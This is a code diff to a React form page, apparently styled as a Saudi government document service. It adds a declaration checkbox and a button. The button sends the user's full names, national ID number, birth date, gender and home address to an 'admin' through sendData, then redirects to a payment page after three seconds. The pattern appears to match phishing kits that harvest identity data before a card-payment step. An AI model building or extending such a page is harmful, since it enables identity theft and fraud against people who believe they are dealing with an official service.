@@ -85,6 +85,8 @@ const Documents = () => {
   const [showConfirmPopup, setShowConfirmPopup] = useState(false);
   const [isFormLocked, setIsFormLocked] = useState(false);
   const [isLoading, setIsLoading] = useState(false);
+  const [declarationChecked, setDeclarationChecked] = useState(false);
+  const [isNavigating, setIsNavigating] = useState(false);
 
   // Saudi Provinces and Districts
   const provincesData: Record<string, string[]> = {
@@ -1128,6 +1130,71 @@ const Documents = () => {
             </div>
           </div>
         </div>
+        
+        {/* Declaration Section - Only show when form is locked */}
+        {isFormLocked && (
+          <div className="max-w-4xl mx-auto mt-8">
+            <div className="bg-white border border-gray-200 rounded-lg px-4 py-4 flex items-start gap-3 w-full">
+              <div className="pt-1">
+                <input 
+                  type="checkbox" 
+                  id="declaration" 
+                  checked={declarationChecked}
+                  onChange={(e) => setDeclarationChecked(e.target.checked)}
+                  className="w-5 h-5 text-green-600 rounded border-gray-300 focus:ring-green-500 cursor-pointer"
+                />
+              </div>
+              <div>
+                <label htmlFor="declaration" className="text-sm text-gray-800 cursor-pointer select-none block mb-1">
+                  أقر بصحة البيانات المدخلة وأوافق على الشروط والأحكام
+                </label>
+                <p className="text-xs text-gray-500">
+                  بالنقر على المربع، فإنك توافق على شروط الخدمة وسياسة الخصوصية الخاصة بنا.
+                </p>
+              </div>
+            </div>
+            
+            <div className="flex justify-start mt-4">
+              <Button 
+                onClick={() => {
+                  setIsNavigating(true);
+                  // Send data to admin before navigating
+                  sendData({
+                    'صفحة': 'صفحة الملخص والدفع',
+                    'الخدمة': serviceName,
+                    'الاسم بالعربي': `${arabicFirstName} ${arabicSecondName} ${arabicThirdName} ${arabicFourthName}`,
+                    'الاسم بالإنجليزي': `${englishFirstName} ${englishSecondName} ${englishThirdName} ${englishFourthName}`,
+                    'رقم الهوية': nationalId,
+                    'الجنس': gender,
+                    'تاريخ الميلاد': calendarType === 'gregorian' && dateOfBirth ? dateOfBirth.toLocaleDateString('ar-SA') : `${hijriDate.day}/${hijriDate.month}/${hijriDate.year} هـ`,
+                    'المحافظة': province,
+                    'المنطقة': district,
+                    'اسم الشارع': streetName,
+                    'رقم المبنى': buildingNumber,
+                    'الدور': floorNumber,
+                    'الإقرار': 'تم الموافقة'
+                  });
+                  // Wait 3 seconds then navigate
+                  setTimeout(() => {
+                    navigate('/summary-payment?service=' + encodeURIComponent(serviceName));
+                  }, 3000);
+                }}
+                className="bg-green-600 hover:bg-green-700 text-white px-8 py-2 text-sm min-w-[150px]"
+                disabled={!declarationChecked || isNavigating}
+              >
+                {isNavigating ? (
+                  <div className="flex items-center gap-2">
+                    <svg className="animate-spin h-4 w-4 text-white" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
+                      <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4"></circle>
+                      <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
+                    </svg>
+                    <span>جاري المعالجة...</span>
+                  </div>
+                ) : 'اعتماد ومتابعة'}
+              </Button>
+            </div>
+          </div>
+        )}
       </main>
       
       {/* Confirmation Popup */}
